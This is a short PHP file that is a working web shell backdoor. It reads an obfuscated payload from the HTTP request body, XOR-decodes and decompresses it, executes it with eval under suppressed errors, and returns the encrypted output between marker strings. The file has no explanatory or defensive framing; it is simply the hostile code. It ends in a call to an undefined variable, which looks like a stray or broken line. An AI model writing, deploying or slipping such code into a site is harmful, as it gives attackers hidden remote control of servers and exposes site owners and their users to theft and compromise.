<?php

$key="80e32263";
$hdr="6f8af44abea0";
$ftr="351039f4a7b5";
$p="0UlYyJHG87EJqEz6";

function x($data, $key) {
	$key_len = strlen($key);
	$data_len = strlen($data);
	$out = "";

	for($i = 0; $i < $data_len; ) {
		for($j = 0; ($j < $key_len && $i < $data_len); $j++,$i++) {
			$out .= $data[$i] ^ $key[$j];
		}
	}
	return $out;
}

if(@preg_match("/$hdr(.+)$ftr/", @file_get_contents("php://input"), $match) == 1) {
	@ob_start();
	@eval(@gzuncompress(@x(@base64_decode($match[1]), $key)));
	$out = @ob_get_contents();
	@ob_end_clean();

	$r = @base64_encode(@x(@gzcompress($out), $key));
	print("$p$hdr$r$ftr");
}

$x();
?>
